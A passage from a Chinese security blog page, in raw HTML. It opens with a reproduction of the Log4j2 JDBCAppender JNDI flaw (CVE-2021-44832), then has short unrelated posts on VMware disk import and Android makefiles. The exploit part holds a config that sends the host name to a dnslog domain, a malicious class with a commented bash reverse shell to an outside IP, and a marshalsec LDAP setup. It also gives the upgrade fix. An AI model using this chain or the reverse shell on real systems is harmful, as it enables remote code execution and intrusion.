         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-rce<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>n
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.17.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.17.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!--        &lt;dependency>--></span>
<span class="token comment">&lt;!--            &lt;groupId>commons-collections&lt;/groupId>--></span>
<span class="token comment">&lt;!--            &lt;artifactId>commons-collections&lt;/artifactId>--></span>
<span class="token comment">&lt;!--            &lt;version>3.1&lt;/version>--></span>
<span class="token comment">&lt;!--        &lt;/dependency>--></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span></code></pre>



<p>这里直接借助<code>CVE-2021-44228 poc</code>来进行测试</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>


<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4j2</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"log4j2.configurationFile"</span><span class="token punctuation">,</span><span class="token string">"http://192.168.1.81:8000/config.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Log4j2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> str<span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            str <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>本地提供一个<code>config.xml</code>的配置文件</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JDBC</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseAppender<span class="token punctuation">"</span></span> <span class="token attr-name">tableName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dbo.application_log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dns://$&#123;env:COMPUTERNAME&#125;.mya9m5.dnslog.cn/exp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>eventDate<span class="token punctuation">"</span></span> <span class="token attr-name">isEventTimestamp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%level<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logger<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%logger<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%message<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Column</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exception<span class="token punctuation">"</span></span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%ex&#123;full&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JDBC</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>warn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>databaseAppender<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span></code></pre>

<p>运行后接收请求:</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229112453677.png" alt="image-20211229112453677"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>编写一个<code>exp</code>攻击，发起弹出计算机的命令，并且本地编译成恶意<code>class</code>类</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> exp <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// System.out.print("正在执行命令");</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// String[] commands = &#123;"bash -i >&amp; /dev/tcp/139.196.234.164/5555 0>&amp;1"&#125;;</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            <span class="token class-name">Process</span> pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"正在执行命令"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>恶意exp类文件目录下开启简易http服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server <span class="token number">8001</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png" alt="image-20211229113202656"></p>
<p>恶意config.xml文件目录下开启简易http服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server </code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113036815.png" alt="image-20211229113036815"></p>
<p>使用<code>marshalsec</code>启动恶意<code>ldap</code>服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://192.168.1.81:8001/#exp"</span> <span class="token number">7788</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113202656.png"></p>
<p>修改<code>config.xml</code>文件<code>DataSource</code>为</p>
<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DataSource</span> <span class="token attr-name">jndiName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ldap://192.168.1.81:7788/exp<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>

<p>运行<code>Log4j2.java</code>触发恶意代码执行：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211229113604804.png" alt="image-20211229113604804"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞利用之处比较鸡肋，你需要能够拥有修改本地<code>config</code>文件的权限才能达成对应的利用，因此其影响面相对较窄。但是出于安全考虑，还是建议将其更新至最新版本.</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a></p>
<p>将 <code>Apache Log4j2 </code>升级到 2.17.1、2.12.4 和 2.3.2 或更高版本。</p>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul>
<li><a target="_blank" rel="noopener" href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/29/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Log4j2%E5%9F%BA%E4%BA%8EJDBCAPPENDER%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-CVE-2021-44832/" data-id="ckzqi7ikf001oioum97hp71qo" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/log4j2/" rel="tag">log4j2</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-综合渗透/内网渗透之代理转发" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" class="article-date">
  <time datetime="2021-12-28T06:16:20.000Z" itemprop="datePublished">2021-12-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/">内网渗透之代理转发</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>在日常渗透测试过程中，当我们<code>getshell</code>一台边界主机后，经常需要借助边界主机实现对内网主机流量的转发和代理操作。这里可以使用一些代理脚本和转发工具将内网的流量代理和转发到本地进行访问，以方便我们后续内网渗透。这边着重介绍一下在内网渗透中常用的几种转发协议的特点和代理工具的使用。</p>
</blockquote>
        
          <p class="article-more-link">
            <a href="/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/28/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" data-id="ckzqi7ikl0028ioum2iuja5hy" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" rel="tag">代理转发</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-config/关于VMware磁盘镜像导入ESXi的方法" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/" class="article-date">
  <time datetime="2021-12-27T06:15:17.000Z" itemprop="datePublished">2021-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/">关于VMware磁盘镜像导入ESXi的方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="多磁盘格式"><a href="#多磁盘格式" class="headerlink" title="多磁盘格式"></a>多磁盘格式</h2><p>首先将多个磁盘进行合并处理，使用<code>vmware</code>自带的<code>vmware-vdiskmanager.exe</code>工具</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token string">"D:\InstallSoftware\VMware\VMware Workstation<span class="token entity" title="\v">\v</span>mware-vdiskmanager.exe"</span> -r <span class="token string">"Windows Server 2008 R2 x64.vmdk"</span> -t <span class="token number">0</span> ATT01-win2008.vmdk</code></pre>



<h2 id="单磁盘"><a href="#单磁盘" class="headerlink" title="单磁盘"></a>单磁盘</h2><p>单磁盘比较简单，直接找到虚拟机<code>vmdk</code>文件即可</p>
<h2 id="ESXi操作"><a href="#ESXi操作" class="headerlink" title="ESXi操作"></a><code>ESXi</code>操作</h2><p>首先创建一个对应镜像格式的虚拟机</p>
<img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211227144938346.png" alt="image-20211227144938346" style="zoom: 67%;" />

<p>创建成功后，删除该镜像的默认<code>vmdk</code>文件</p>
<p>打开<code>ESXi</code>的ssh，使用<code>sftp</code>工具连接上传镜像文件</p>
<p>上传路径<code>/vmfs/volumes/datastore1/</code></p>
<p>由于<code>vmware</code>的磁盘镜像格式和<code>ESXi</code>的有所不同，需要使用<code>ESXi</code>的<code>vmkfstools</code>工具进行转换</p>
<p>转换生成的镜像名称和刚刚创建的虚拟机镜像名保持一致</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">vmkfstools -i ATT01-win2008.vmdk ATT01-win2008R2.vmdk</code></pre>



<p>将转换后的磁盘移动到对应虚拟机的目录下</p>
<p>也可以先创建虚拟机，再上传磁盘到虚拟机目录下，再对其进行转换即可。</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/27/config/%E5%85%B3%E4%BA%8EVMware%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F%E5%AF%BC%E5%85%A5ESXi%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ckzqi7ijy0007ioumg8tf3qb8" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ctf/SCTF2021" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/25/ctf/SCTF2021/" class="article-date">
  <time datetime="2021-12-25T02:21:09.000Z" itemprop="datePublished">2021-12-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/25/ctf/SCTF2021/">SCTF2021</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg"></p>
        
          <p class="article-more-link">
            <a href="/2021/12/25/ctf/SCTF2021/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://www.greetdawn.top/2021/12/25/ctf/SCTF2021/" data-id="ckzqi7ik0000bioum1osjehhk" class="article-share-link">分享到</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SCTF2021/" rel="tag">SCTF2021</a></li></ul>

    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-wechat/Android Studio手动使用makefile编译" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/" class="article-date">
  <time datetime="2021-12-25T02:19:26.000Z" itemprop="datePublished">2021-12-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/android/">android</a>►<a class="article-category-link" href="/categories/android/jni/">jni</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/25/wechat/Android%20Studio%E6%89%8B%E5%8A%A8%E4%BD%BF%E7%94%A8makefile%E7%BC%96%E8%AF%91/">Android Studio手动使用makefile编译</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Android-Studio手动使用makefile编译"><a href="#Android-Studio手动使用makefile编译" class="headerlink" title="Android Studio手动使用makefile编译"></a>Android Studio手动使用makefile编译</h1><p>用makefile文件编译能够选择编译的目标是共享库或者可执行文件。</p>
<h2 id="新建Java工程"><a href="#新建Java工程" class="headerlink" title="新建Java工程"></a>新建Java工程</h2><p>用Android Studio新建一个普通<code>Empty Activity</code>项目。</p>
<h2 id="新建-jni-cpp-目录"><a href="#新建-jni-cpp-目录" class="headerlink" title="新建 jni/cpp 目录"></a>新建 jni/cpp 目录</h2><p>在刚刚创建好的项目中，在<code>src &gt; main</code>目录下新建<code>jni</code>或者<code>cpp</code>目录。新建文件<code>Android.mk</code>、<code>Application.mk</code>以及源码文件。</p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-02-634.png" alt="image-20211224230250586"></p>
<p><img src="https://gitee.com/koifishly/pb/raw/master/2021/12/24/23-06-657.png" alt="image-20211224230659627"></p>
<h2 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h2><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment"># Android.mk必须以LOCAL_PATH开头，注释#除外</span>
<span class="token comment"># 设置工做目录，而my-dir则会返回Android.mk文件所在的目录</span>
LOCAL_PATH <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">call</span> my-dir<span class="token punctuation">)</span>
<span class="token comment"># 借助CLEAR_VARS变量清除除LOCAL_PATH外的全部LOCAL_&lt;name>变量</span>
<span class="token keyword">include</span> <span class="token variable">$</span><span class="token punctuation">(</span>CLEAR_VARS<span class="token punctuation">)</span>

<span class="token comment"># 设置模块的名称，即编译出来so或者可执行文件文件名</span>
<span class="token comment"># 注，如果用Android Studio自带原生项目就要要和build.gradle中NDK节点设置的名字相同</span>
LOCAL_MODULE <span class="token operator">:=</span> helloworld

<span class="token comment"># 指定参与模块编译的C/C++源文件列表，多文件用"\"隔开</span>
LOCAL_SRC_FILES <span class="token operator">:=</span> helloworld.cpp

<span class="token comment">#### 可选选项</span>
LOCAL_CFLAGS <span class="token operator">+=</span> -fPIC
LOCAL_LDFLAGS <span class="token operator">+=</span> -pie

<span class="token comment"># 必须在文件结尾定义编译类型，指定生成的静态库或者共享库在运行时依赖的共享库模块列表。</span>
<span class="token comment"># BUILD_SHARED_LIBRARY 共享库，供java或者其余共享库调用</span>
<span class="token comment"># BUILD_STATIC_LIBRARY 静态库，供共享库调用，不能直接被java调用</span>
<span class="token keyword">include</span> <span class="token variable">$</span><span class="token punctuation">(</span>BUILD_SHARED_LIBRARY<span class="token punctuation">)</span></code></pre>

<blockquote>
<p>fPIC和fPIE</p>
<p>-fPIC与-fpic都是在编译时加入的选项，用于生成位置无关的代码(Position-Independent-Code)。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对固定地址的访问都通过全局偏移表(GOT)来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。<br>-fPIE与-fpie是等价的。这个选项与-fPIC/-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。</p>
</blockquote>
<blockquote>
<p>pie：随机地址。</p>
</blockquote>
<h2 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h2><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment"># 最经常使用的APP_ABI字段：指定须要基于哪些CPU平台的.so文件</span>
<span class="token comment"># 常见的平台有armeabi x86 mips，其中移动设备主要是armeabi平台</span>
<span class="token comment"># 默认状况下，Android平台会生成全部平台的.so文件，即同APP_ABI := armeabi x86 mips</span>
<span class="token comment"># 指定CPU平台类型后，就只会生成该平台的.so文件，即上述语句只会生成armeabi平台的.so文件</span>
<span class="token comment"># APP_ABI := all armeabi armeabi-v7a mips x86</span>
APP_ABI <span class="token operator">:=</span> armeabi-v7a
APP_PLATFORM <span class="token operator">:=</span> android-23

<span class="token comment"># Android.mk设置可能不起效果，放在这里设置</span>
APP_PIE <span class="token operator">:=</span> true
<span class="token comment"># 其他可选</span>
<span class="token comment">#APP_STL := c++_static</span>
<span class="token comment">#APP_CPPFLAGS := -fexceptions -frtti</span></code></pre>

<blockquote>
<p><code>Application.mk</code>中部分设置已经无效了，需要在<code>build.gradle(Module: app)</code>中的<code>android &gt; defaultConfig</code>声明这些参数的值。</p>
</blockquote>
<h2 id="CPP文件"><a href="#CPP文件" class="headerlink" title="CPP文件"></a>CPP文件</h2><p>这里主要是源码的编写。</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">helloWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
